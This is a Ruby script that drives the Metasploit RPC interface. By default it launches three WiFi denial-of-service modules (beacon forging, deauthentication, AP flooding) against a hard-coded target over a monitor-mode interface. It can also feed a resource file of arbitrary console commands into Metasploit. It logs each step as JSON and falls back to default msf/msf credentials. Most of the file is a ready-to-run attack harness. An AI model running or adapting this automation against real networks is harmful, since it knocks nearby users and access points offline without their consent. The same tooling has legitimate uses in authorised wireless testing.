#!/usr/bin/env ruby
# frozen_string_literal: true

require 'net/http'
require 'json'
require 'time'
require 'rexml/document'

class MsfRpc
  def initialize(host, port, user, pass)
    @http = Net::HTTP.new(host, port)
    @http.open_timeout = 10
    @http.read_timeout = 300
    @token = authenticate(user, pass)
  end

  def authenticate(user, pass)
    resp = call('auth.login', user, pass)
    tok = resp['token']
    raise 'authentication failed' unless tok
    tok
  end

  def call(method, *args)
    xml = build_request(method, args)
    resp = @http.post('/api/', xml, { 'Content-Type' => 'text/xml' })
    parse_response(resp.body)
  end

  def module_execute(mod_type, mod_name, opts = {})
    call('module.execute', @token, mod_type, mod_name, opts)
  end

  def console_create
    call('console.create', @token)['id']
  end

  def console_write(cid, data)
    call('console.write', @token, cid, data)
  end

  def console_read(cid)
    call('console.read', @token, cid)
  end

  private

  def build_request(method, args)
    xml = "<?xml version=\"1.0\"?>\n<methodCall>\n"
    xml += "<methodName>#{esc(method)}</methodName>\n<params>\n"
    args.each { |a| xml += "<param>#{valxml(a)}</param>\n" }
    xml += "</params>\n</methodCall>\n"
    xml
  end

  def esc(s)
    s.to_s.gsub('&', '&amp;').gsub('<', '&lt;').gsub('>', '&gt;')
         .gsub('"', '&quot;').gsub("'", '&apos;')
  end

  def valxml(val)
    case val
    when String then "<value><string>#{esc(val)}</string></value>"
    when Integer, Float then "<value><#{val.class.name.downcase}>#{val}</#{val.class.name.downcase}></value>"
    when TrueClass then '<value><boolean>1</boolean></value>'
    when FalseClass then '<value><boolean>0</boolean></value>'
    when Hash
      m = val.map { |k, v| "<member><name>#{esc(k.to_s)}</name>#{valxml(v)}</member>" }.join
      "<value><struct>#{m}</struct></value>"
    when Array
      "<value><array><data>#{val.map { |v| valxml(v) }.join}</data></array></value>"
    else "<value><string>#{esc(val.to_s)}</string></value>"
    end
  end

  def parse_response(body)
    doc = REXML::Document.new(body)
    fault = REXML::XPath.first(doc, '/methodResponse/fault')
    if fault
      v = parse_value(fault.elements['value'])
      raise "XMLRPC fault: #{v.inspect}"
    end
    param = REXML::XPath.first(doc, '/methodResponse/params/param/value')
    param ? parse_value(param) : nil
  end

  def parse_value(elem)
    child = elem.elements[1]
    return elem.text&.to_s || '' unless child
    case child.name
    when 'string' then child.text || ''
    when 'int', 'i4' then child.text.to_i
    when 'boolean' then child.text == '1'
    when 'double' then child.text.to_f
    when 'array'
      child.elements['data']&.elements&.map { |e| parse_value(e) } || []
    when 'struct'
      h = {}
      child.each_element('member') { |m| h[m.elements['name']&.text || ''] = parse_value(m.elements['value']) }
      h
    when 'base64' then child.text&.unpack1('m') || ''
    else child.text || ''
    end
  end
end

begin
  workspace = nil
  resource = nil
  i = 0
  while i < ARGV.length
    case ARGV[i]
    when '--workspace' then workspace = ARGV[i += 1]
    when '--resource'  then resource = ARGV[i += 1]
    end
    i += 1
  end

  msf = MsfRpc.new(ENV['MSF_HOST'] || '127.0.0.1',
                   (ENV['MSF_PORT'] || 55553).to_i,
                   ENV['MSF_USER'] || 'msf',
                   ENV['MSF_PASS'] || 'msf')

  puts JSON.generate({ event: 'msf_connected', iface: '', bssid: '', ssid: '', channel: 0,
    data: { token: msf.instance_variable_get(:@token)[0..8] },
    timestamp: Time.now.iso8601 })
  $stdout.flush

  if workspace
    msf.call('db.set_workspace', msf.instance_variable_get(:@token), workspace)
    puts JSON.generate({ event: 'msf_workspace', iface: '', bssid: '', ssid: '', channel: 0,
      data: { workspace: workspace }, timestamp: Time.now.iso8601 })
    $stdout.flush
  end

  if resource
    cid = msf.console_create
    File.readlines(resource).each do |line|
      cmd = line.strip
      next if cmd.empty? || cmd.start_with?('#')
      msf.console_write(cid, cmd + "\n")
      sleep(0.5)
      r = msf.console_read(cid)
      out = r.is_a?(Hash) ? r['data'].to_s : r.to_s
      puts JSON.generate({ event: 'msf_command', iface: '', bssid: '', ssid: '', channel: 0,
        data: { cmd: cmd, output: out[0..500] }, timestamp: Time.now.iso8601 })
      $stdout.flush
    end
  else
    %w[auxiliary/dos/wifi/wifi_beacon_forge
       auxiliary/dos/wifi/wifi_deauth
       auxiliary/dos/wifi/wifi_ap_dos].each do |mod|
      begin
        r = msf.module_execute('auxiliary', mod, { 'RHOSTS' => '10.0.0.1',
          'INTERFACE' => 'wlan0mon', 'TIMEOUT' => 30 })
        puts JSON.generate({ event: 'msf_module', iface: '', bssid: '', ssid: '', channel: 0,
          data: { module: mod, result: r }, timestamp: Time.now.iso8601 })
      rescue => me
        puts JSON.generate({ event: 'msf_module_error', iface: '', bssid: '', ssid: '', channel: 0,
          data: { module: mod, error: me.message }, timestamp: Time.now.iso8601 })
      end
      $stdout.flush
    end
  end

rescue => e
  $stderr.puts JSON.generate({ event: 'error', iface: '', bssid: '', ssid: '', channel: 0,
    data: { message: e.message, backtrace: e.backtrace&.first },
    timestamp: Time.now.iso8601 })
  exit 1
end
